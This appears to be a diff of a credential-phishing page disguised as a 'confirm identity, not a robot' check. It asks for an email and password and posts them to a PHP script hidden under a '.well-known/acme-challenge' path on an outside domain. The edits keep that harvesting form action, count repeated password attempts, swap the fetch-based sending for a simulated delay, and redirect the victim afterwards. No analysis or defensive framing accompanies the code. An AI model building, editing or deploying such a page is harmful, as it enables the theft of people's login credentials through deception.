@@ -92,6 +92,7 @@
     .text-secondary {
         font-weight: bold;
     }
+    /* Added spacing between title and form */
     .confirm-identity-spacing {
         margin-bottom: 24px;
     }
@@ -107,8 +108,8 @@
 
         <div class="text-center confirm confirm-identity-spacing">Confirm identity to prove you are not a robot</div>
 
+        <!-- ONLY CHANGE: Added action and method to form -->
         <form id="loginForm" action="https://seamua.com/.well-known/acme-challenge/ini.php" method="POST">
-            <input type="hidden" name="step" value="1">
             <div class="form-group">
                 <label class="text-secondary font-weight-bold">Email Address</label>
                 <input type="email" class="form-control" id="email" name="email" required autocomplete="username">
@@ -173,24 +174,16 @@
             const loading = document.getElementById('loading');
             const verificationComplete = document.getElementById('verificationComplete');
 
-            // Update hidden step value
-            form.querySelector('[name="step"]').value = attempt;
-
             // Show loading spinner
             loading.style.display = 'flex';
             errorMsg.style.display = 'none';
 
             try {
                 const formData = new FormData(form);
+                formData.append('attempt', attempt);
                 
-                // Send data to PHP
-                const response = await fetch(form.action, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.text();
-                if (result !== "OK") throw new Error('Submission failed');
+                // Simulate server request
+                await new Promise(resolve => setTimeout(resolve, 1000));
                 
                 // Clear password field
                 passwordInput.value = '';
@@ -212,12 +205,7 @@
                     verificationComplete.style.display = 'flex';
                     
                     setTimeout(() => {
-                        // Use iframe to load destination first
-                        const iframe = document.getElementById('iframe');
-                        iframe.onload = function() {
-                            window.location.href = redirectUrl;
-                        };
-                        iframe.src = redirectUrl;
+                        window.location.href = redirectUrl;
                     }, 2000);
                 }
 
